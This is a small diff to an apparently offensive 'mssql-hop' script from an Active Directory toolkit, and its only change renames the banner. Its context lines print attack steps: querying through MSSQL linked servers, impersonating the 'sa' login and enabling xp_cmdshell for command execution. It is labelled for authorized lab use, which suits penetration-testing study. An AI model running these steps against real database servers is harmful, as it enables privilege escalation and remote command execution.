@@ -53,7 +53,7 @@ def main() -> int:
         print("[!] need --password or --hash")
         return 2
     secret = args.password
-    print("GOTAD mssql-hop — authorized lab only")
+    print("ADTK mssql-hop — authorized lab only")
     print("After links: EXEC ('SELECT @@SERVERNAME, SYSTEM_USER') AT [LINK];")
     print("Then EXECUTE AS LOGIN = 'sa';  EXEC sp_configure 'xp_cmdshell', 1;")
     for name, sql in QUERIES:
